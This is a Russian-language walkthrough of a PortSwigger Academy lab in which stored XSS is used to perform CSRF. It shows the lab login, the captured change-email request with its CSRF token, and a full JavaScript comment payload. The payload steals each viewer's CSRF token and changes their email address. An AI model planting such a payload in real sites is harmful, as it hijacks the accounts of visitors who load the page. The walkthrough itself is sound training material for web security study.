залогинемся под `wiener:peter` для начала
и увидим, что его актуальная почта - `wiener@normal-user.net`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/25.%20Exploiting%20XSS%20to%20perform%20CSRF/pics%20for%20walkthrough/1.png)
изменим почту на `test@test.com` и посмотрим в `Proxy` -> `HTTP history`  запросы
Нам неоходим запрос 
```
POST /my-account/change-email
```
где указаны новый почтовый яшик и csrf токен
```
email=test%40test.com&csrf=10zdNqaH3vCOXWZGpwoQhLCkNUd24cI8
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/25.%20Exploiting%20XSS%20to%20perform%20CSRF/pics%20for%20walkthrough/2.png)
далее нам необходимо сформировать DGA Домент в `Collaborator` с помощью кнопки `Copy to clipboard`
```
0qrdto0uxy99vi867povssa21t7mvcj1.oastify.com
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/25.%20Exploiting%20XSS%20to%20perform%20CSRF/pics%20for%20walkthrough/3.png)
Далее перейдем в любое из обсуждений и в поле комментарий вставим запрос
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test2@test.com')
};
</script>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/25.%20Exploiting%20XSS%20to%20perform%20CSRF/pics%20for%20walkthrough/4.png)

Тем самым, данный скрипт позволит всем, кто откроет данный комментарий, изменить их почту на `test2@test.com`
и получим сообщение об успешно выполненной лабораторной работе


а в самой странице данный скрипт выглядит следующим образом
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/25.%20Exploiting%20XSS%20to%20perform%20CSRF/pics%20for%20walkthrough/5.png)
